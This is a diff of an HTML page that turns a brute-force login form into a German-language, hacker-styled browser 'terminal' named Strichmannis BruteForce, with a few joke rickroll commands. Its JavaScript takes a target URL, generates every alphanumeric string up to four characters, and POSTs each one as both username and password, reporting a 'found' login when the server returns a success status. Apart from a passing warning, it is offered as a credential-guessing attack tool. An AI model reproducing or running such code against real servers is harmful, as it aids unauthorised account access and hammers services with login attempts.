@@ -3,24 +3,203 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Brute Force Username and Password Cracker</title>
+    <title>Strichmannis BruteForce</title>
+    <style>
+        body {
+            background-color: black;
+            color: green;
+            font-family: monospace;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+        #terminal {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        #output {
+            text-align: left;
+            width: 80%;
+            margin: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        #input-line {
+            margin-top: 20px;
+        }
+        input {
+            color: green;
+            background: black;
+            border: none;
+            outline: none;
+            width: 100%;
+            font-family: monospace;
+            font-size: 16px;
+            color: #0f0;
+        }
+    </style>
 </head>
 <body>
-    <h1>Brute Force Username and Password Cracker</h1>
-    <form action="bruteforce.php" method="post">
-        <label for="target_url">Target URL or IP:</label>
-        <input type="text" id="target_url" name="target_url" required><br><br>
+    <div id="terminal">
+        <pre id="ascii-art">
+⠀⢠⣶⣿⣿⣗⡢⠀⠀⠀⠀⠀⠀⢤⣒⣿⣿⣷⣆⠀⠀
+⠀⠋⠉⠉⠙⠻⣿⣷⡄⠀⠀⠀⣴⣿⠿⠛⠉⠉⠉⠃⠀
+⠀⠀⢀⡠⢤⣠⣀⡹⡄⠀⠀⠀⡞⣁⣤⣠⠤⡀⠀⠀⠀
+⢐⡤⢾⣿⣿⢿⣿⡿⠀⠀⠀⠀⠸⣿⣿⢿⣿⣾⠦⣌⠀
+⠁⠀⠀⠀⠉⠈⠀⠀⣸⠀⠀⢰⡀⠀⠈⠈⠀⠀⠀⠀⠁
+⠀⠀⠀⠀⠀⠀⣀⡔⢹⠀⠀⢸⠳⡄⡀⠀⠀⠀⠀⠀⠀
+⠸⡦⣤⠤⠒⠋⠘⢠⡸⣀⣀⡸⣠⠘⠉⠓⠠⣤⢤⡞⠀
+⠀⢹⡜⢷⣄⠀⣀⣀⣾⡶⢶⣷⣄⣀⡀⢀⣴⢏⡾⠁⠀
+⠀⠀⠹⡮⡛⠛⠛⠻⠿⠥⠤⠽⠿⠛⠛⠛⣣⡾⠁⠀⠀
+⠀⠀⠀⠙⢄⠁⠀⠀⠀⣄⣀⡄⠀⠀⠀⢀⠞⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠂⠀⠀⠀⢸⣿⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+        </pre>
+        <div id="warning" style="display:none;">
+            <p>⚠️ Warnung: Machen Sie nichts Illegales! ⚠️</p>
+        </div>
+        <div id="output"></div>
+        <div id="input-line">
+            <input type="text" id="command-input" placeholder="Geben Sie Ihren Befehl ein...">
+        </div>
+    </div>
 
-        <label for="username_target">Username to brute-force:</label>
-        <input type="text" id="username_target" name="username_target" required><br><br>
-        
-        <label for="password_target">Password to brute-force:</label>
-        <input type="text" id="password_target" name="password_target" required><br><br>
-        
-        <label for="max_length">Maximum length of username and password to try:</label>
-        <input type="number" id="max_length" name="max_length" required><br><br>
-        
-        <input type="submit" value="Start Brute Force">
-    </form>
+    <script>
+        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        let attempts = 0;
+        const maxLength = 4; // Setze eine maximale Länge zum Testen
+
+        const commands = {
+            'bruteforce': function(args) {
+                const url = args[0];
+                if (!url) {
+                    printOutput("Fehler: Kein Server angegeben.");
+                    return;
+                }
+                printOutput(`Starte Brute-Force auf ${url}...`);
+                bruteForce(url);
+            },
+            'rr': function() {
+                printOutput("Weiterleitung zu Rick Astley...");
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+            },
+            'rickroll': function() {
+                printOutput("Weiterleitung zu Rick Astley...");
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+            },
+            'help': function() {
+                printOutput("Verfügbare Befehle:\n" +
+                             "bruteforce [Server] - Starte den Brute-Force-Angriff auf den angegebenen Server.\n" +
+                             "rr - Leitet zu Rick Astleys YouTube-Video weiter.\n" +
+                             "rickroll - Leitet zu Rick Astleys YouTube-Video weiter.\n" +
+                             "help - Zeigt diese Hilfe an.");
+            }
+        };
+
+        function generateCombinations(length) {
+            if (length === 1) return chars.split('');
+            const smallerCombos = generateCombinations(length - 1);
+            const combinations = [];
+            for (const combo of smallerCombos) {
+                for (const char of chars) {
+                    combinations.push(combo + char);
+                }
+            }
+            return combinations;
+        }
+
+        async function testLogin(url, username, password) {
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+                });
+
+                // Hier können Sie eine erfolgreiche Antwort überprüfen
+                if (response.ok) {
+                    return true;
+                }
+            } catch (error) {
+                console.error('Fehler beim Testen der Anmeldung:', error);
+            }
+            return false;
+        }
+
+        async function bruteForce(url) {
+            const start = performance.now();
+            const outputElement = document.getElementById('output');
+            let found = false;
+
+            for (let length = 1; length <= maxLength; length++) {
+                const combinations = generateCombinations(length);
+                for (const combo of combinations) {
+                    attempts++;
+                    const [username, password] = [combo, combo]; // Beispielhaft: gleicher Wert für Username und Passwort
+                    outputElement.innerText += `\nVersuch ${attempts}: ${username}:${password}`;
+                    
+                    if (await testLogin(url, username, password)) {
+                        const end = performance.now();
+                        outputElement.innerText += `\nGefunden: ${username}:${password} in ${attempts} Versuchen und ${((end - start) / 1000).toFixed(2)} Sekunden.`;
+                        found = true;
+                        break;
+                    }
+                }
+                if (found) break;
+            }
+            
+            if (!found) {
+                const end = performance.now();
+                outputElement.innerText += `\nNicht gefunden in ${attempts} Versuchen und ${((end - start) / 1000).toFixed(2)} Sekunden.`;
+            }
+        }
+
+        function printOutput(message) {
+            const outputElement = document.getElementById('output');
+            outputElement.innerText += `\n${message}`;
+            outputElement.scrollTop = outputElement.scrollHeight; // Scrollen zum Ende
+        }
+
+        function handleCommand(command) {
+            const [cmd, ...args] = command.split(' ');
+            if (commands[cmd]) {
+                commands[cmd](args);
+            } else {
+                printOutput(`Unbekannter Befehl: ${cmd}. Geben Sie 'help' ein, um eine Liste der Befehle zu erhalten.`);
+            }
+        }
+
+        document.getElementById('command-input').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                const command = this.value.trim();
+                if (command) {
+                    printOutput(`> ${command}`);
+                    handleCommand(command);
+                    this.value = ''; // Eingabefeld zurücksetzen
+                }
+            }
+        });
+
+        window.onload = function() {
+            setTimeout(() => {
+                document.getElementById('ascii-art').style.display = 'none';
+                document.getElementById('warning').style.display = 'block';
+                setTimeout(() => {
+                    document.getElementById('warning').style.display = 'none';
+                    document.getElementById('output').innerText = "Willkommen bei Strichmannis BruteForce. Geben Sie 'help' ein, um eine Liste der Befehle zu sehen.";
+                }, 3000);
+            }, 3000);
+        }
+    </script>
 </body>
 </html>
